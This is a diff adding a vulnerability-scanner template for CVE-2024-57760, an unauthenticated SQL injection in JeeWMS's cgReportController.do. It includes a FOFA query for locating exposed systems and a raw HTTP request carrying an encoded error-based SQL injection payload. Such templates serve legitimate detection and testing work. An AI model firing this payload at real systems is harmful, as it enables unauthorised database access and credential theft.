@@ -1,0 +1,29 @@
+id: JeeWMS-cgReportController_do-sql-CVE-2024-57760
+
+info:
+  name: "JeeWMS cgReportController.do 接口SQL注入漏洞"
+  author: Unknown
+  severity: high
+  description: |-
+    fofa: body="url:userController.do?userOrgSelect&userId=" && "loginController.do?changeDefaultOrg"
+      JeeWMS 系统 cgReportController.do 接口存在 SQL 注入安全缺陷，攻击者无需认证即可通过构造恶意请求注入任意 SQL 语句，实现数据库敏感信息提取（包括但不限于管理员凭证、用户隐私数据）及服务器文件写入操作，在具备足够权限条件下可进一步控制目标系统。
+  reference:
+  - https://mp.weixin.qq.com/s/49z43IJdn1XbOvO_i0T45g
+  tags: JeeWMS
+
+http:
+- raw:
+  - |
+    GET /rest/../cgReportController.do?datagrid&configId=%27+AND+GTID_SUBSET%28CONCAT%280x7178627a71%2C%28SELECT+%28ELT%284503%3D4503%2C1%29%29%29%2C0x717a6a6b71%29%2C4503%29--+wnMN HTTP/1.1
+    Host: {{Hostname}}
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36
+
+  matchers-condition: and
+  matchers:
+  - type: word
+    part: body
+    words:
+    - 'qxbzq1qzjkq'
+  - type: status
+    status:
+    - 200
